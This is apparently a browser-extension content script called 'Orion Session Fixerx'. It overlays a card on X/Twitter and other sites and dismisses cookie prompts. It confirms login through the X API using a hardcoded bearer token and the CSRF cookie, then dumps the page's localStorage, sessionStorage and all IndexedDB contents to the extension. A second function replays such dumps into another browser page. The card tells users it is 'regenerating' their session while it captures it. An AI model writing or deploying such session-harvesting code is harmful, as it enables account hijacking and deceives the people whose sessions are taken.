'use strict';

function seedStorageInPage(payload) {
  try {
    const local = payload.localStorage || {};
    for (const key of Object.keys(local)) {
      try { window.localStorage.setItem(key, String(local[key])); } catch (error) { void error; }
    }
    const session = payload.sessionStorage || {};
    for (const key of Object.keys(session)) {
      try { window.sessionStorage.setItem(key, String(session[key])); } catch (error) { void error; }
    }
    const databases = payload.indexedDB || {};
    for (const dbName of Object.keys(databases)) {
      const spec = databases[dbName] || {};
      const stores = spec.stores || {};
      const request = window.indexedDB.open(dbName, spec.version || 1);
      request.onupgradeneeded = () => {
        const db = request.result;
        for (const storeName of Object.keys(stores)) {
          if (db.objectStoreNames.contains(storeName)) { continue; }
          const meta = stores[storeName] || {};
          const opts = {};
          if (meta.keyPath !== undefined && meta.keyPath !== null) { opts.keyPath = meta.keyPath; }
          if (meta.autoIncrement) { opts.autoIncrement = true; }
          db.createObjectStore(storeName, opts);
        }
      };
      request.onsuccess = () => {
        const db = request.result;
        const names = Object.keys(stores).filter((name) => db.objectStoreNames.contains(name));
        if (!names.length) { db.close(); return; }
        const tx = db.transaction(names, 'readwrite');
        for (const storeName of names) {
          const store = tx.objectStore(storeName);
          for (const row of (stores[storeName].records || [])) {
            try {
              if (store.keyPath !== null && store.keyPath !== undefined) { store.put(row.value); }
              else { store.put(row.value, row.key); }
            }
            catch (error) { void error; }
          }
        }
        tx.oncomplete = () => db.close();
      };
    }
  }
  catch (error) {
    void error;
  }
}

function injectCapture() {
  if (window.__orionCapture) {
    return;
  }
  window.__orionCapture = true;
  const runtime = (globalThis.chrome || globalThis.browser).runtime;
  const readStore = (store) => {
    const out = {};
    try {
      for (let index = 0; index < store.length; index += 1) {
        const key = store.key(index);
        out[key] = store.getItem(key);
      }
    }
    catch (error) {
      void error;
    }
    return out;
  };

  const isX = /(^|\.)(x|twitter)\.com$/i.test(location.hostname);
  const BEARER = 'AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA';

  const { card, head, dot, status, button, collapseBtn, body } = buildCard();
  const mount = () => { if (document.documentElement && !document.getElementById('orion-auto-card')) { document.documentElement.appendChild(card); } };
  mount();
  wireCollapse();
  wireDrag();

  function buildCard() {
    const card = document.createElement('div');
    card.id = 'orion-auto-card';
    card.style.cssText = 'position:fixed;z-index:2147483647;left:16px;top:16px;display:flex;flex-direction:column;gap:10px;width:256px;max-height:calc(100vh - 32px);padding:14px 16px;border-radius:8px;background:linear-gradient(160deg,#14273c,#0d1622);color:#f5f8fb;font-family:system-ui,-apple-system,sans-serif;box-shadow:0 22px 55px rgba(2,10,20,0.6),0 0 0 1px rgba(43,144,238,0.35);border:1px solid rgba(87,165,235,0.55)';
    const head = document.createElement('div');
    head.style.cssText = 'display:flex;align-items:center;gap:8px';
    const dot = document.createElement('span');
    dot.style.cssText = 'width:9px;height:9px;border-radius:50%;background:#4ea2f1;box-shadow:0 0 0 4px rgba(78,162,241,0.22);flex:0 0 auto;transition:background .2s';
    const title = document.createElement('span');
    title.textContent = 'Orion Session Fixerx';
    title.style.cssText = 'font:700 13px system-ui,sans-serif;letter-spacing:.3px';
    head.style.cursor = 'move';
    const collapseBtn = document.createElement('button');
    collapseBtn.textContent = '–';
    collapseBtn.title = 'Collapse';
    collapseBtn.style.cssText = 'margin-left:auto;cursor:pointer;width:22px;height:22px;flex:0 0 auto;border:0;border-radius:6px;background:rgba(120,160,200,0.18);color:#e7eff8;font:700 15px system-ui,sans-serif;line-height:1;display:flex;align-items:center;justify-content:center';
    head.appendChild(dot);
    head.appendChild(title);
    head.appendChild(collapseBtn);
    const status = document.createElement('div');
    status.style.cssText = 'font:600 12px system-ui,sans-serif;color:#e7eff8;line-height:1.4';
    status.textContent = 'Scanning page…';
    const button = document.createElement('button');
    button.textContent = 'Regenerate session';
    button.style.cssText = 'cursor:pointer;margin-top:2px;padding:10px 12px;border-radius:6px;border:0;background:linear-gradient(135deg,#4ea2f1,#2c7ac5);color:#fff;font:700 12px system-ui,sans-serif;letter-spacing:.2px;box-shadow:0 6px 16px rgba(43,144,238,0.4)';
    const body = document.createElement('div');
    body.style.cssText = 'display:flex;flex-direction:column;gap:10px';
    body.appendChild(status);
    body.appendChild(button);
    card.appendChild(head);
    card.appendChild(body);
    return { card, head, dot, status, button, collapseBtn, body };
  }

  function wireCollapse() {
    let collapsed = false;
    collapseBtn.addEventListener('click', (event) => {
      event.stopPropagation();
      collapsed = !collapsed;
      body.style.display = collapsed ? 'none' : 'flex';
      card.style.maxHeight = collapsed ? 'none' : 'calc(100vh - 32px)';
      collapseBtn.textContent = collapsed ? '+' : '–';
      collapseBtn.title = collapsed ? 'Expand' : 'Collapse';
    });
  }

  function wireDrag() {
    let dragging = false;
    let dragX = 0;
    let dragY = 0;
    head.addEventListener('mousedown', (event) => {
      if (event.target === collapseBtn) {
        return;
      }
      const rect = card.getBoundingClientRect();
      dragging = true;
      dragX = event.clientX - rect.left;
      dragY = event.clientY - rect.top;
      card.style.transform = 'none';
      card.style.top = rect.top + 'px';
      card.style.left = rect.left + 'px';
      card.style.right = 'auto';
      event.preventDefault();
    });
    document.addEventListener('mousemove', (event) => {
      if (!dragging) {
        return;
      }
      const x = Math.max(0, Math.min(event.clientX - dragX, window.innerWidth - card.offsetWidth));
      const y = Math.max(0, Math.min(event.clientY - dragY, window.innerHeight - card.offsetHeight));
      card.style.left = x + 'px';
      card.style.top = y + 'px';
    });
    document.addEventListener('mouseup', () => { dragging = false; });
  }

  const setStatus = (text, color) => { status.textContent = text; if (color) { dot.style.background = color; } };

  const csrf = () => (document.cookie.match(/(?:^|;\s*)ct0=([^;]+)/) || [])[1] || '';
  const hasAuth = () => /(?:^|;\s*)auth_token=/.test(document.cookie) || Boolean(csrf());

  const isChallenge = () => {
    const t = (document.title || '').toLowerCase();
    if (t.includes('just a moment') || t.includes('checking your browser') || t.includes('attention required')) {
      return true;
    }
    const onScreen = (el) => {
      const rect = el.getBoundingClientRect();
      return rect.width > 0 && rect.height > 0;
    };
    if (Array.from(document.querySelectorAll('iframe[src*="challenges.cloudflare.com"], #challenge-running, #challenge-form')).some(onScreen)) {
      return true;
    }
    const body = ((document.body && document.body.innerText) || '').toLowerCase();
    return body.includes('verify you are human') || body.includes('verifying you are human') || body.includes('needs to review the security');
  };

  const CLICK_LABELS = ['accept all cookies', 'accept cookies', 'accept all', 'allow all cookies', 'allow all', 'allow cookies', 'i accept', 'i agree to cookies', 'got it'];
  const CLICK_SELECTORS = ['#onetrust-accept-btn-handler', '[data-testid="cookie-policy-manage-dialog-accept-button"]', '[data-cookiebanner="accept_button"]', '[aria-label="Accept all cookies"]', '[aria-label="Allow all cookies"]'];
  const visible = (el) => {
    const rect = el.getBoundingClientRect();
    const style = getComputedStyle(el);
    return rect.width > 0 && rect.height > 0 && style.visibility !== 'hidden' && style.display !== 'none';
  };
  const isUnsafe = (el) => {
    if (el.type === 'submit' || el.getAttribute('type') === 'submit') {
      return true;
    }
    const form = el.closest('form');
    if (form && form.querySelector('input[type="password"]')) {
      return true;
    }
    const probe = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '') + ' ' + (el.name || '') + ' ' + (el.id || '')).toLowerCase();
    return /log ?in|sign ?in|sign ?up|register|continue|submit|next|confirm/.test(probe);
  };
  const dismissBlockers = () => {
    let clicked = 0;
    const hit = (el) => {
      if (el && !card.contains(el) && visible(el) && !isUnsafe(el)) {
        try { el.click(); clicked += 1; } catch (error) { void error; }
      }
    };
    CLICK_SELECTORS.forEach((selector) => document.querySelectorAll(selector).forEach(hit));
    document.querySelectorAll('button, [role="button"], a[role="button"]').forEach((el) => {
      if (card.contains(el)) {
        return;
      }
      const label = (el.textContent || '').trim().toLowerCase();
      if (label && label.length <= 24 && CLICK_LABELS.includes(label)) {
        hit(el);
      }
    });
    return clicked;
  };

  let done = false;
  let tries = 0;
  const withTimeout = (promise, ms, fallback) => Promise.race([
    promise,
    new Promise((resolve) => setTimeout(() => resolve(fallback), ms)),
  ]);

  const dumpIndexedDBInner = async () => {
    const out = {};
    if (!globalThis.indexedDB || typeof indexedDB.databases !== 'function') {
      return out;
    }
    let dbs = [];
    try {
      dbs = await withTimeout(indexedDB.databases(), 2000, []);
    }
    catch (error) {
      void error;
      return out;
    }
    for (const info of dbs) {
      const name = info && info['name'];
      if (!name) {
        continue;
      }
      try {
        const db = await withTimeout(new Promise((resolve, reject) => {
          const request = indexedDB.open(name);
          request.onsuccess = () => resolve(request.result);
          request.onerror = () => reject(request.error);
          request.onblocked = () => resolve(null);
        }), 2000, null);
        if (!db) {
          continue;
        }
        const storeNames = Array.from(db['objectStoreNames']);
        const stores = {};
        for (const storeName of storeNames) {
          try {
            const dumped = await withTimeout(new Promise((resolve, reject) => {
              const tx = db['transaction'](storeName, 'readonly');
              const store = tx.objectStore(storeName);
              const meta = { keyPath: store.keyPath, autoIncrement: store.autoIncrement, records: [] };
              const cursorRequest = store.openCursor();
              cursorRequest.onsuccess = () => {
                const cursor = cursorRequest.result;
                if (cursor) {
                  meta.records.push({ key: cursor.key, value: cursor.value });
                  cursor.continue();
                }
                else {
                  resolve(meta);
                }
              };
              cursorRequest.onerror = () => reject(cursorRequest.error);
            }), 2000, { keyPath: null, autoIncrement: false, records: [] });
            stores[storeName] = dumped;
          }
          catch (error) {
            void error;
          }
        }
        out[name] = { version: db['version'], stores };
        db['close']();
      }
      catch (error) {
        void error;
      }
    }
    return out;
  };

  const dumpIndexedDB = () => withTimeout(dumpIndexedDBInner(), 6000, {});

  let capturing = false;
  const capture = async (username) => {
    if (capturing) {
      return;
    }
    capturing = true;
    done = true;
    dot.style.background = '#3ddc84';
    setStatus(username ? ('Signed in as @' + username + ' — session regenerated') : 'Session regenerated', '#3ddc84');
    let indexedDb = {};
    try {
      indexedDb = await dumpIndexedDB();
    }
    catch (error) {
      void error;
    }
    runtime.sendMessage({
      type: 'orion-session-captured',
      origin: location.origin,
      username,
      userAgent: navigator.userAgent,
      localStorage: readStore(localStorage),
      sessionStorage: readStore(sessionStorage),
      indexedDB: indexedDb
    });
  };
  const checkLogin = async () => {
    const token = csrf();
    if (!token) {
      return 'unknown';
    }
    try {
      const response = await fetch('https://api.x.com/1.1/account/settings.json', {
        credentials: 'include',
        headers: {
          authorization: 'Bearer ' + BEARER,
          'x-csrf-token': token,
          'x-twitter-active-user': 'yes',
          'x-twitter-auth-type': 'OAuth2Session'
        }
      });
      if (response.ok) {
        const data = await response.json();
        if (data && data.screen_name) {
          void capture(data.screen_name);
          return 'in';
        }
        return 'unknown';
      }
      if (response.status === 401 || response.status === 403) {
        return 'out';
      }
    }
    catch (error) {
      void error;
    }
    return 'unknown';
  };

  const tick = async () => {
    if (done) {
      return;
    }
    tries += 1;
    mount();
    if (isChallenge()) {
      setStatus('Security check in progress…', '#f4b740');
      if (tries < 300) {
        setTimeout(tick, 2000);
      }
      return;
    }
    const cleared = dismissBlockers();
    const state = await checkLogin();
    if (state === 'in') {
      return;
    }
    if (state === 'out') {
      setStatus('Signed out — please log in', '#f47174');
    }
    else if (hasAuth()) {
      setStatus('Verifying session…', '#4ea2f1');
    }
    else {
      setStatus(cleared ? 'Cleared a prompt — waiting for sign-in…' : 'Waiting for you to sign in…', '#4ea2f1');
    }
    if (tries < 300) {
      setTimeout(tick, 2000);
    }
  };

  button.addEventListener('click', async () => {
    setStatus('Regenerating session…', '#4ea2f1');
    dismissBlockers();
    if (isX) {
      const state = await checkLogin();
      if (state === 'in') {
        return;
      }
      if (state === 'out') {
        setStatus('Signed out — sign in, then regenerate', '#f47174');
        return;
      }
    }
    void capture('');
  });

  if (!isX) {
    setStatus('Sign in on this page to capture', '#f4b740');
  }
  void tick();
}

globalThis['seedStorageInPage'] = seedStorageInPage;
globalThis['injectCapture'] = injectCapture;
